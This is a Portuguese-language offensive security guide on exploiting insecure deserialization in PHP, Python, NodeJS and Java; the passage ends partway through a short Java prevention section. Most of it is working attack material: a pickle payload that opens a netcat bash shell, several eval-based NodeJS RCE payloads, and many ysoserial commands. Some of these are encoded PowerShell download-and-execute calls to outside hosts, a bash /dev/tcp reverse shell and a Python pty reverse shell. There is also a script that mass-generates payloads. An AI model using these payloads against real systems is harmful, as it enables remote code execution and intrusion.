# Desserializa√ß√£o

**Serializa√ß√£o** √© o processo de transformar um objeto em um formato de dados que pode ser restaurado posteriormente. As pessoas frequentemente serializam objetos para salv√°-los em armazenamento ou para enviar como parte de comunica√ß√µes.

**Desserializa√ß√£o** √© o processo inverso, pegando dados estruturados de algum formato e reconstruindo-o em um objeto. Atualmente, o formato de dados mais popular para serializar dados √© o JSON. Antes disso, era o XML.

Em muitas ocasi√µes, voc√™ pode encontrar algum c√≥digo no lado do servidor que desserializa algum objeto fornecido pelo usu√°rio. Nesse caso, voc√™ pode enviar uma carga maliciosa para fazer com que o lado do servidor se comporte de maneira inesperada.

**Voc√™ deve ler:** [**https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html**](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html) **para aprender como atacar.**

## PHP

M√©todo m√°gico usado com serializa√ß√£o:

* `__sleep` √© chamado quando um objeto √© serializado e deve ser retornado para um array.

M√©todo m√°gico usado com desserializa√ß√£o:

* `__wakeup` √© chamado quando um objeto √© desserializado.
* `__unserialize` √© chamado em vez de `__wakeup` se existir.
* `__destruct` √© chamado quando o script PHP termina e o objeto √© destru√≠do.
* `__toString` usa o objeto como string, mas tamb√©m pode ser usado para ler arquivos ou mais do que isso com base na chamada de fun√ß√£o dentro dele.
```php
<?php
class test {
    public $s = "This is a test";
    public function displaystring(){
        echo $this->s.'<br />';
    }
    public function __toString()
    {
        echo '__toString method called';
    }
    public function __construct(){
        echo "__construct method called";
    }
    public function __destruct(){
        echo "__destruct method called";
    }
    public function __wakeup(){
        echo "__wakeup method called";
    }
    public function __sleep(){
        echo "__sleep method called";
        return array("s"); #The "s" makes references to the public attribute
    }
}

$o = new test();
$o->displaystring();
$ser=serialize($o);
echo $ser;
$unser=unserialize($ser);
$unser->displaystring();

/*
php > $o = new test();
__construct method called
__destruct method called
php > $o->displaystring();
This is a test<br />

php > $ser=serialize($o);
__sleep method called

php > echo $ser;
O:4:"test":1:{s:1:"s";s:14:"This is a test";}

php > $unser=unserialize($ser);
__wakeup method called
__destruct method called

php > $unser->displaystring();
This is a test<br />
*/
?>
```
Se voc√™ olhar para os resultados, poder√° ver que as fun√ß√µes **`__wakeup`** e **`__destruct`** s√£o chamadas quando o objeto √© desserializado. Note que em v√°rios tutoriais voc√™ encontrar√° que a fun√ß√£o **`__toString`** √© chamada ao tentar imprimir algum atributo, mas aparentemente isso **n√£o est√° mais acontecendo**.

{% hint style="warning" %}
O m√©todo **`__unserialize(array $data)`** √© chamado **em vez de `__wakeup()`** se ele for implementado na classe. Ele permite desserializar o objeto fornecendo os dados serializados como um array. Voc√™ pode usar este m√©todo para desserializar propriedades e realizar quaisquer tarefas necess√°rias na desserializa√ß√£o.
```php
phpCopy codeclass MyClass {
    private $property;

    public function __unserialize(array $data): void {
        $this->property = $data['property'];
        // Perform any necessary tasks upon deserialization.
    }
}
```
{% endhint %}

Voc√™ pode ler um exemplo **PHP explicado aqui**: [https://www.notsosecure.com/remote-code-execution-via-php-unserialize/](https://www.notsosecure.com/remote-code-execution-via-php-unserialize/), aqui [https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf](https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf) ou aqui [https://securitycafe.ro/2015/01/05/understanding-php-object-injection/](https://securitycafe.ro/2015/01/05/understanding-php-object-injection/)

### PHP Deserial + Classes de Autoload

Voc√™ pode abusar da funcionalidade de autoload do PHP para carregar arquivos php arbitr√°rios e mais:

{% content-ref url="php-deserialization-+-autoload-classes.md" %}
[php-deserialization-+-autoload-classes.md](php-deserialization-+-autoload-classes.md)
{% endcontent-ref %}

### Serializando Valores Referenciados

Se por algum motivo voc√™ deseja serializar um valor como uma **refer√™ncia a outro valor serializado**, voc√™ pode:
```php
<?php
class AClass {
    public $param1;
    public $param2;
}

$o = new WeirdGreeting;
$o->param1 =& $o->param22;
$o->param = "PARAM";
$ser=serialize($o);
```
### PHPGGC (ysoserial para PHP)

[**PHPGCC**](https://github.com/ambionics/phpggc) pode ajud√°-lo a gerar payloads para abusar de deserializa√ß√µes em PHP.\
Observe que em v√°rios casos voc√™ **n√£o ser√° capaz de encontrar uma maneira de abusar de uma deserializa√ß√£o no c√≥digo-fonte** da aplica√ß√£o, mas voc√™ pode ser capaz de **abusar do c√≥digo de extens√µes PHP externas.**\
Ent√£o, se poss√≠vel, verifique o `phpinfo()` do servidor e **pesquise na internet** (e at√© mesmo nos **gadgets** do **PHPGCC**) alguns poss√≠veis gadgets que voc√™ poderia abusar.

### Deserializa√ß√£o de metadados phar://

Se voc√™ encontrou um LFI que est√° apenas lendo o arquivo e n√£o executando o c√≥digo php dentro dele, por exemplo, usando fun√ß√µes como _**file\_get\_contents(), fopen(), file() ou file\_exists(), md5\_file(), filemtime() ou filesize()**_**. Voc√™ pode tentar abusar de uma **deserializa√ß√£o** que ocorre quando **l√™** um **arquivo** usando o protocolo **phar**.\
Para mais informa√ß√µes, leia o seguinte post:

{% content-ref url="../file-inclusion/phar-deserialization.md" %}
[phar-deserialization.md](../file-inclusion/phar-deserialization.md)
{% endcontent-ref %}

## Python

### **Pickle**

Quando o objeto √© desempacotado, a fun√ß√£o _\_\_reduce\_\__ ser√° executada.\
Quando explorado, o servidor pode retornar um erro.
```python
import pickle, os, base64
class P(object):
    def __reduce__(self):
        return (os.system,("netcat -c '/bin/bash -i' -l -p 1234 ",))
print(base64.b64encode(pickle.dumps(P())))
```
Para obter mais informa√ß√µes sobre como escapar de **jaulas de pickle**, consulte:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

### Yaml **&** jsonpickle

A seguinte p√°gina apresenta a t√©cnica de **abusar da desserializa√ß√£o insegura em bibliotecas python yamls** e termina com uma ferramenta que pode ser usada para gerar carga √∫til de desserializa√ß√£o RCE para **Pickle, PyYAML, jsonpickle e ruamel.yaml**:

{% content-ref url="python-yaml-deserialization.md" %}
[python-yaml-deserialization.md](python-yaml-deserialization.md)
{% endcontent-ref %}

### Polui√ß√£o de Classe (Python Prototype Pollution)

{% content-ref url="../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md" %}
[class-pollution-pythons-prototype-pollution.md](../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md)
{% endcontent-ref %}

## NodeJS

### Fun√ß√µes M√°gicas JS

JS **n√£o tem fun√ß√µes "m√°gicas"** como PHP ou Python que ser√£o executadas apenas para criar um objeto. Mas tem algumas **fun√ß√µes** que s√£o **frequentemente usadas mesmo sem serem chamadas diretamente** como **`toString`**, **`valueOf`**, **`toJSON`**.\
Se abusar de uma desserializa√ß√£o, voc√™ pode **comprometer essas fun√ß√µes para executar outro c√≥digo** (potencialmente abusando de polui√ß√µes de prot√≥tipos) e poderia executar c√≥digo arbitr√°rio quando elas s√£o chamadas.

Outra **maneira "m√°gica" de chamar uma fun√ß√£o** sem cham√°-la diretamente √© **comprometer um objeto que √© retornado por uma fun√ß√£o ass√≠ncrona** (promessa). Porque, se voc√™ **transformar** esse **objeto de retorno** em outra **promessa** com uma **propriedade** chamada **"then" do tipo fun√ß√£o**, ela ser√° **executada** apenas porque √© retornada por outra promessa. _Siga_ [_**este link**_](https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/) _para mais informa√ß√µes._
```javascript
// If you can compromise p (returned object) to be a promise
// it will be executed just because it's the return object of an async function:
async function test_resolve() {
  const p = new Promise(resolve => {
    console.log('hello')
    resolve()
  })
  return p
}

async function test_then() {
  const p = new Promise(then => {
    console.log('hello')
    return 1
  })
  return p
}

test_ressolve()
test_then()
//For more info: https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/
```
### Polui√ß√£o de `__proto__` e `prototype`

Se voc√™ deseja aprender sobre essa t√©cnica, **d√™ uma olhada no seguinte tutorial**:

{% content-ref url="nodejs-proto-prototype-pollution/" %}
[nodejs-proto-prototype-pollution](nodejs-proto-prototype-pollution/)
{% endcontent-ref %}

### [node-serialize](https://www.npmjs.com/package/node-serialize)

Essa biblioteca permite serializar fun√ß√µes. Exemplo:
```javascript
var y = {
 "rce": function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })},
}
var serialize = require('node-serialize');
var payload_serialized = serialize.serialize(y);
console.log("Serialized: \n" + payload_serialized);
```
O **objeto serializado** parecer√° com:
```bash
{"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })}"}
```
Voc√™ pode ver no exemplo que quando uma fun√ß√£o √© serializada, a flag `_$$ND_FUNC$$_` √© adicionada ao objeto serializado.

Dentro do arquivo `node-serialize/lib/serialize.js`, voc√™ pode encontrar a mesma flag e como o c√≥digo a est√° usando.

![](<../../.gitbook/assets/image (297).png>)

![](<../../.gitbook/assets/image (298).png>)

Como voc√™ pode ver no √∫ltimo trecho de c√≥digo, **se a flag for encontrada**, `eval` √© usado para desserializar a fun√ß√£o, ent√£o basicamente **a entrada do usu√°rio est√° sendo usada dentro da fun√ß√£o `eval`**.

No entanto, **apenas serializar** uma fun√ß√£o **n√£o a executar√°** j√° que seria necess√°rio que alguma parte do c√≥digo esteja **chamando `y.rce`** em nosso exemplo e isso √© altamente **improv√°vel**.\
De qualquer forma, voc√™ poderia apenas **modificar o objeto serializado** **adicionando alguns par√™nteses** para executar automaticamente a fun√ß√£o serializada quando o objeto for desserializado.\
No pr√≥ximo trecho de c√≥digo, **observe o √∫ltimo par√™ntese** e como a fun√ß√£o `unserialize` executar√° automaticamente o c√≥digo:
```javascript
var serialize = require('node-serialize');
var test = {"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"};
serialize.unserialize(test);
```
Como foi indicado anteriormente, esta biblioteca ir√° obter o c√≥digo ap√≥s `_$$ND_FUNC$$_` e ir√° **execut√°-lo** usando `eval`. Portanto, para **autoexecutar o c√≥digo**, voc√™ pode **excluir a parte de cria√ß√£o da fun√ß√£o** e o √∫ltimo par√™ntese e **apenas executar um JS em uma linha**, como no exemplo a seguir:
```javascript
var serialize = require('node-serialize');
var test = '{"rce":"_$$ND_FUNC$$_require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) })"}';
serialize.unserialize(test);
```
Voc√™ pode [**encontrar aqui**](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/) **mais informa√ß√µes** sobre como explorar essa vulnerabilidade.

### [funcster](https://www.npmjs.com/package/funcster)

A diferen√ßa interessante aqui √© que os **objetos padr√£o integrados n√£o s√£o acess√≠veis**, porque est√£o fora do escopo. Isso significa que podemos executar nosso c√≥digo, mas n√£o podemos chamar os m√©todos dos objetos integrados. Ent√£o, se usarmos `console.log()` ou `require(something)`, o Node retorna uma exce√ß√£o como `"ReferenceError: console is not defined"`.

No entanto, podemos facilmente recuperar o acesso a tudo porque ainda temos acesso ao contexto global usando algo como `this.constructor.constructor("console.log(1111)")();`:
```javascript
funcster = require("funcster");
//Serialization
var test = funcster.serialize(function() { return "Hello world!" })
console.log(test) // { __js_function: 'function(){return"Hello world!"}' }

//Deserialization with auto-execution
var desertest1 = { __js_function: 'function(){return "Hello world!"}()' }
funcster.deepDeserialize(desertest1)
var desertest2 = { __js_function: 'this.constructor.constructor("console.log(1111)")()' }
funcster.deepDeserialize(desertest2)
var desertest3 = { __js_function: 'this.constructor.constructor("require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });")()' }
funcster.deepDeserialize(desertest3)
```
**Para mais informa√ß√µes, leia esta p√°gina.**

### [**serialize-javascript**](https://www.npmjs.com/package/serialize-javascript)

O pacote **n√£o inclui nenhuma funcionalidade de desserializa√ß√£o** e requer que voc√™ a implemente por conta pr√≥pria. O exemplo deles usa `eval` diretamente. Este √© o exemplo oficial de desserializa√ß√£o:
```javascript
function deserialize(serializedJavascript){
  return eval('(' + serializedJavascript + ')');
}
```
Se essa fun√ß√£o √© usada para desserializar objetos, voc√™ pode **facilmente explor√°-la**:
```javascript
var serialize = require('serialize-javascript');
//Serialization
var test = serialize(function() { return "Hello world!" });
console.log(test) //function() { return "Hello world!" }

//Deserialization
var test = "function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"
deserialize(test)
```
### Biblioteca Cryo

Nas p√°ginas a seguir, voc√™ pode encontrar informa√ß√µes sobre como abusar dessa biblioteca para executar comandos arbitr√°rios:

* [https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)
* [https://hackerone.com/reports/350418](https://hackerone.com/reports/350418)

## Java - HTTP

O principal problema com objetos desserializados em Java √© que **callbacks de desserializa√ß√£o foram invocados durante a desserializa√ß√£o**. Isso torna poss√≠vel para um **atacante** **aproveitar esses callbacks** e preparar uma carga √∫til que abusa dos callbacks para **realizar a√ß√µes maliciosas**.

### Impress√µes digitais

#### Caixa branca

Procure dentro do c√≥digo por classes e fun√ß√µes de serializa√ß√£o. Por exemplo, procure por classes que implementam `Serializable`, o uso de `java.io.ObjectInputStream` ou fun√ß√µes `readObject` ou `readUnshare`.

Voc√™ tamb√©m deve ficar de olho em:

* `XMLdecoder` com par√¢metros definidos pelo usu√°rio externo
* `XStream` com m√©todo `fromXML` (a vers√£o xstream <= v1.46 √© vulner√°vel ao problema de serializa√ß√£o)
* `ObjectInputStream` com `readObject`
* Usos de `readObject`, `readObjectNodData`, `readResolve` ou `readExternal`
* `ObjectInputStream.readUnshared`
* `Serializable`

#### Caixa preta

**Impress√µes digitais/Bytes m√°gicos** de objetos **serializados em Java** (de `ObjectInputStream`):

* `AC ED 00 05` em Hex
* `rO0` em Base64
* Cabe√ßalho `Content-type` de uma resposta HTTP definido como `application/x-java-serialized-object`
* `1F 8B 08 00` Hex previamente comprimido
* `H4sIA` Base64 previamente comprimido
* Arquivos da web com extens√£o `.faces` e par√¢metro `faces.ViewState`. Se voc√™ encontrar isso em um aplicativo da web, d√™ uma olhada no [**post sobre desserializa√ß√£o Java JSF VewState**](java-jsf-viewstate-.faces-deserialization.md).
```
javax.faces.ViewState=rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwdAAML2xvZ2luLnhodG1s
```
### Verificar se √© vulner√°vel

Se voc√™ quer **aprender sobre como funciona uma explora√ß√£o de deserializa√ß√£o Java**, voc√™ deve dar uma olhada em [**Deserializa√ß√£o Java B√°sica**](basic-java-deserialization-objectinputstream-readobject.md), [**Deserializa√ß√£o Java DNS**](java-dns-deserialization-and-gadgetprobe.md) e [**Carga √ötil do CommonsCollection1**](java-transformers-to-rutime-exec-payload.md).

#### Teste de Caixa Branca

Voc√™ pode verificar se h√° alguma aplica√ß√£o instalada com vulnerabilidades conhecidas.
```bash
find . -iname "*commons*collection*"
grep -R InvokeTransformer .
```
Voc√™ pode tentar **verificar todas as bibliotecas** conhecidas por serem vulner√°veis e que o [**Ysoserial**](https://github.com/frohoff/ysoserial) pode fornecer uma explora√ß√£o. Ou voc√™ pode verificar as bibliotecas indicadas em [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#genson-json).\
Voc√™ tamb√©m pode usar o [**gadgetinspector**](https://github.com/JackOfMostTrades/gadgetinspector) para procurar poss√≠veis cadeias de gadgets que possam ser exploradas.\
Ao executar o **gadgetinspector** (depois de constru√≠-lo), n√£o se preocupe com as toneladas de avisos/erros que ele est√° passando e deixe-o terminar. Ele escrever√° todas as descobertas em _gadgetinspector/gadget-results/gadget-chains-year-month-day-hore-min.txt_. Por favor, note que o **gadgetinspector n√£o criar√° uma explora√ß√£o e pode indicar falsos positivos**.

#### Teste de Caixa Preta

Usando a extens√£o do Burp [**gadgetprobe**](java-dns-deserialization-and-gadgetprobe.md), voc√™ pode identificar **quais bibliotecas est√£o dispon√≠veis** (e at√© mesmo as vers√µes). Com essas informa√ß√µes, pode ser **mais f√°cil escolher um payload** para explorar a vulnerabilidade.\
[**Leia mais sobre o GadgetProbe aqui**](java-dns-deserialization-and-gadgetprobe.md#gadgetprobe)**.**\
O GadgetProbe √© focado em desserializa√ß√µes de \*\* `ObjectInputStream` \*\*.\*\*

Usando a extens√£o do Burp [**Java Deserialization Scanner**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner), voc√™ pode **identificar bibliotecas vulner√°veis** explor√°veis com o ysoserial e **explor√°-las**.\
[**Leia mais sobre o Java Deserialization Scanner aqui.**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner)\
O Java Deserialization Scanner √© focado em desserializa√ß√µes de **`ObjectInputStream`**.

Voc√™ tamb√©m pode usar o [**Freddy**](https://github.com/nccgroup/freddy) para **detectar vulnerabilidades de desserializa√ß√£o** no **Burp**. Este plugin detectar√° vulnerabilidades relacionadas n√£o apenas ao `ObjectInputStream`, mas tamb√©m a bibliotecas de desserializa√ß√£o de **Json** e **Yml**. No modo ativo, ele tentar√° confirm√°-las usando payloads de sleep ou DNS.\
[**Voc√™ pode encontrar mais informa√ß√µes sobre o Freddy aqui.**](https://www.nccgroup.com/us/about-us/newsroom-and-events/blog/2018/june/finding-deserialisation-issues-has-never-been-easier-freddy-the-serialisation-killer/)

#### Teste de Serializa√ß√£o

N√£o se trata apenas de verificar se alguma biblioteca vulner√°vel √© usada pelo servidor. √Äs vezes, voc√™ pode ser capaz de **alterar os dados dentro do objeto serializado e contornar algumas verifica√ß√µes** (talvez conceder privil√©gios de administrador dentro de um aplicativo da web).\
Se voc√™ encontrar um objeto serializado Java sendo enviado para um aplicativo da web, **voc√™ pode usar o** [**SerializationDumper**](https://github.com/NickstaDB/SerializationDumper) **para imprimir em um formato mais leg√≠vel para humanos o objeto de serializa√ß√£o que est√° sendo enviado**. Saber quais dados voc√™ est√° enviando tornaria mais f√°cil modific√°-los e contornar algumas verifica√ß√µes.

### **Explora√ß√£o**

#### **ysoserial**

A ferramenta mais conhecida para explorar desserializa√ß√µes Java √© o [**ysoserial**](https://github.com/frohoff/ysoserial) ([**baixe aqui**](https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)). Voc√™ tamb√©m pode considerar o uso do [**ysoseral-modified**](https://github.com/pimps/ysoserial-modified), que permitir√° que voc√™ use comandos complexos (com pipes, por exemplo).\
Observe que esta ferramenta est√° **centrada** em explorar **`ObjectInputStream`**.\
Eu **come√ßaria usando o payload "URLDNS"** antes de um payload RCE para testar se a inje√ß√£o √© poss√≠vel. De qualquer forma, observe que talvez o payload "URLDNS" n√£o esteja funcionando, mas outro payload RCE esteja.
```bash
# PoC to make the application perform a DNS req
java -jar ysoserial-master-SNAPSHOT.jar URLDNS http://b7j40108s43ysmdpplgd3b7rdij87x.burpcollaborator.net > payload

# PoC RCE in Windows
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections5 'cmd /c ping -n 5 127.0.0.1' > payload
# Time, I noticed the response too longer when this was used
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c timeout 5" > payload
# Create File
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c echo pwned> C:\\\\Users\\\\username\\\\pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c nslookup jvikwa34jwgftvoxdz16jhpufllb90.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c certutil -urlcache -split -f http://j4ops7g6mi9w30verckjrk26txzqnf.burpcollaborator.net/a a"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAYwBlADcAMABwAG8AbwB1ADAAaABlAGIAaQAzAHcAegB1AHMAMQB6ADIAYQBvADEAZgA3ADkAdgB5AC4AYgB1AHIAcABjAG8AbABsAGEAYgBvAHIAYQB0AG8AcgAuAG4AZQB0AC8AYQAnACkA"
## In the ast http request was encoded: IEX(New-Object Net.WebClient).downloadString('http://1ce70poou0hebi3wzus1z2ao1f79vy.burpcollaborator.net/a')
## To encode something in Base64 for Windows PS from linux you can use: echo -n "<PAYLOAD>" | iconv --to-code UTF-16LE | base64 -w0
# Reverse Shell
## Encoded: IEX(New-Object Net.WebClient).downloadString('http://192.168.1.4:8989/powercat.ps1')
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANAA6ADgAOQA4ADkALwBwAG8AdwBlAHIAYwBhAHQALgBwAHMAMQAnACkA"

#PoC RCE in Linux
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "ping -c 5 192.168.1.4" > payload 
# Time
## Using time in bash I didn't notice any difference in the timing of the response
# Create file
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "touch /tmp/pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "dig ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "nslookup ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "curl ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net" > payload
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "wget ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# Reverse shell
## Encoded: bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}" | base64 -w0
## Encoded: export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,ZXhwb3J0IFJIT1NUPSIxMjcuMC4wLjEiO2V4cG9ydCBSUE9SVD0xMjM0NTtweXRob24gLWMgJ2ltcG9ydCBzeXMsc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKG9zLmdldGVudigiUkhPU1QiKSxpbnQob3MuZ2V0ZW52KCJSUE9SVCIpKSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZmQpIGZvciBmZCBpbiAoMCwxLDIpXTtwdHkuc3Bhd24oIi9iaW4vc2giKSc=}|{base64,-d}|{bash,-i}"

# Base64 encode payload in base64
base64 -w0 payload
```
Ao criar um payload para **java.lang.Runtime.exec()**, voc√™ **n√£o pode usar caracteres especiais** como ">" ou "|" para redirecionar a sa√≠da de uma execu√ß√£o, "$()" para executar comandos ou at√© mesmo **passar argumentos** para um comando separados por **espa√ßos** (voc√™ pode fazer `echo -n "hello world"`, mas n√£o pode fazer `python2 -c 'print "Hello world"'`). Para codificar corretamente o payload, voc√™ pode [usar esta p√°gina da web](http://www.jackson-t.ca/runtime-exec-payloads.html).

Sinta-se √† vontade para usar o pr√≥ximo script para criar **todos os poss√≠veis payloads de execu√ß√£o de c√≥digo** para Windows e Linux e, em seguida, test√°-los na p√°gina da web vulner√°vel:
```python
import os
import base64
 
# You may need to update the payloads
payloads = ['BeanShell1', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2', 'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'CommonsCollections7', 'Groovy1', 'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'JRMPClient', 'JSON1', 'JavassistWeld1', 'Jdk7u21', 'MozillaRhino1', 'MozillaRhino2', 'Myfaces1', 'Myfaces2', 'ROME', 'Spring1', 'Spring2', 'Vaadin1', 'Wicket1']
def generate(name, cmd):
    for payload in payloads:
        final = cmd.replace('REPLACE', payload)
        print 'Generating ' + payload + ' for ' + name + '...'
        command = os.popen('java -jar ysoserial.jar ' + payload + ' "' + final + '"')
        result = command.read()
        command.close()
        encoded = base64.b64encode(result)
        if encoded != "":
            open(name + '_intruder.txt', 'a').write(encoded + '\n')
 
generate('Windows', 'ping -n 1 win.REPLACE.server.local')
generate('Linux', 'ping -c 1 nix.REPLACE.server.local')
```
#### serialkillerbypassgadgets

Voc√™ pode **usar** [**https://github.com/pwntester/SerialKillerBypassGadgetCollection**](https://github.com/pwntester/SerialKillerBypassGadgetCollection) **junto com o ysoserial para criar mais exploits**. Mais informa√ß√µes sobre essa ferramenta nos **slides da apresenta√ß√£o** onde a ferramenta foi apresentada: [https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next\_slideshow=1](https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next\_slideshow=1)

#### marshalsec

[**marshalsec** ](https://github.com/mbechler/marshalsec)pode ser usado para gerar payloads para explorar diferentes bibliotecas de serializa√ß√£o **Json** e **Yml** em Java.\
Para compilar o projeto, eu precisei **adicionar** essas **depend√™ncias** ao `pom.xml`:
```markup
<dependency>
		<groupId>javax.activation</groupId>
		<artifactId>activation</artifactId>
		<version>1.1.1</version>
</dependency>
		
<dependency>
		<groupId>com.sun.jndi</groupId>
		<artifactId>rmiregistry</artifactId>
		<version>1.2.1</version>
		<type>pom</type>
</dependency>
```
**Instale o Maven** e **compile** o projeto:
```bash
sudo apt-get install maven
mvn clean package -DskipTests
```
#### FastJSON

Leia mais sobre esta biblioteca Java JSON: [https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html](https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html)

### Laborat√≥rios

* Se voc√™ quiser testar alguns payloads ysoserial, voc√™ pode **executar este aplicativo da web**: [https://github.com/hvqzao/java-deserialize-webapp](https://github.com/hvqzao/java-deserialize-webapp)
* [https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/](https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/)

### Por que

Java ADORA enviar objetos serializados por toda parte. Por exemplo:

* Em **solicita√ß√µes HTTP** - Par√¢metros, ViewState, Cookies, voc√™ escolhe.
* **RMI** - O protocolo Java RMI amplamente utilizado √© 100% baseado em serializa√ß√£o
* **RMI sobre HTTP** - Muitos aplicativos da web de cliente espesso Java usam isso - novamente objetos 100% serializados
* **JMX** - Novamente, depende de objetos serializados sendo enviados pela rede
* **Protocolos personalizados** - Enviar e receber objetos Java brutos √© a norma - o que veremos em alguns dos exploits que vir√£o

### Preven√ß√£o

#### Objetos Transientes

Uma classe que implementa `Serializable` pode implementar como `transient` qualquer objeto dentro da classe que n√£o deve ser serializado. Por exemplo:
```java
public class myAccount implements Serializable
{
    private transient double profit; // declared transient
    private transient double margin; // declared transient
```
#### Evite a Serializa√ß√£o de uma classe que precisa implementar Serializable

Alguns dos objetos de sua aplica√ß√£o podem ser for√ßados a implementar `Serializable` devido √† sua hierarquia. Para garantir que seus objetos de aplica√ß√£o n√£o possam ser desserializados, um m√©todo `readObject()` deve ser declarado (com um modificador `final`) que sempre lan√ßa uma exce√ß√£o:
```java
private final void readObject(ObjectInputStream in) throws java.io.IOException {
    throw new java.io.IOException("Cannot be deserialized");
}
```
#### Verifique a classe desserializada antes de desserializ√°-la

A classe `java.io.ObjectInputStream` √© usada para desserializar objetos. √â poss√≠vel fortalecer seu comportamento criando uma subclasse. Essa √© a melhor solu√ß√£o se:

* Voc√™ pode alterar o c√≥digo que faz a desserializa√ß√£o
* Voc√™ sabe quais classes espera desserializar

A ideia geral √© substituir [`ObjectInputStream.html#resolveClass()`](https://docs.oracle.com/javase/7/docs/api/java/io/ObjectInputStream.html#resolveClass\(java.io.ObjectStreamClass\)) para restringir quais classes s√£o permitidas para desserializa√ß√£o.

Como essa chamada acontece antes de um `readObject()` ser chamado, voc√™ pode ter certeza de que nenhuma atividade de desserializa√ß√£o ocorrer√°, a menos que o tipo seja um que voc√™ deseja permitir.

Um exemplo simples disso √© mostrado aqui, onde a classe `LookAheadObjectInputStream` √© garantida de n√£o desserializar nenhum outro tipo al√©m da classe `Bicycle`:
```java
public class LookAheadObjectInputStream extends ObjectInputStream {

    public LookAheadObjectInputStream(InputStream inputStream) throws IOException {
        super(inputStream);
    }

    /**
    * Only deserialize instances of our expected Bicycle class
    */
    @Override
    protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
        if (!desc.getName().equals(Bicycle.class.getName())) {
